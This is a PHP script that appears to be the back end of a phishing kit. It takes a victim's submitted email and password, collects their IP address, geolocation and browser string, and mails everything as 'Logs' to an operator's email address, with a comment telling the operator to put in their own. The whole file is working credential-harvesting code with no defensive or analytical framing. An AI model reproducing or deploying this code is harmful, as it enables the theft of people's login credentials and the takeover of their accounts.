<?php header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$YourEmail = "andrewpylypczuk@aol.com";  /*Replace This with your email*/

$_POST['to'] = $YourEmail;
if ((isset($_POST["username"]) && filter_var($_POST["username"], FILTER_VALIDATE_EMAIL)) && (isset($_POST["password"]) && strlen(@trim($_POST["password"])) > 0)) {
    $ip = "";
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $DESTINATION_EMAIL = $_POST['to'] ?? "";
    $second = $_POST['subject'] ?? "";
    $ips = getRealIpAddr('ip');
    $ip = !empty($ips) ? $ips : $ip;
    $details = getRealIpAddr("", $ip);
    $country = $details->geoplugin_countryName;
    $state = $details->geoplugin_regionName;
    $city = $details->geoplugin_city;
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $time = date("m-d-Y g:i:a");
    $msg = "--------------< Demoforce >--------------------------\n ";
    $msg .= "-----------------< Email Provider >---------------------------\n ";
    $msg .= "Provider : Logs from DR{$second}\n ";
    $msg .= "-----------------< Email Access >---------------------------\n ";
    $msg .= "Email : " . $_POST["username"] . "\n ";
    $msg .= "Password : " . $_POST["password"] . "\n ";
    $msg .= "-------------------< Location >--------------------------------\n ";
    $msg .= "Sent from $ip on $time\n ";
    $msg .= "Country: $country | State: $state | City: $city\n ";
    $msg .= "---------------------< Browser >----------------------------------\n ";
    $msg .= "USER-WEB-BROWSER:       $browser\n ";
    $msg .= "-------------< Demoforce >---------------------------------\n\n\n ";
    $subject = "Logs From Dr{$second} $ip";
    $headers = "From: Drtoolz <{$_POST['username']}>";
    @mail($DESTINATION_EMAIL, $subject, $msg);
    echo json_encode(["working"]);
} else {
    echo json_encode(["not working"]);
}
function getRealIpAddr($code = "", $ips = "")
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = !empty(@trim($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : $ips;
    }
    if ($code) {
        if (strtolower($code) == "country") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_countryName;
        } else if (strtolower($code) == "code") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_countryCode;
        } else if (strtolower($code) == "state") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_regionName;
        } else if (strtolower($code) == "city") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_city;
        } else if (strtolower($code) == "region") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_region;
        } else if (strtolower($code) == "currency") {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip)->geoplugin_currencySymbol;
        } else if (strtolower($code) == "ip") {
            return $ip;
        } else {
            return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);
        }
    } else {
        return simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);
    }
} ?>
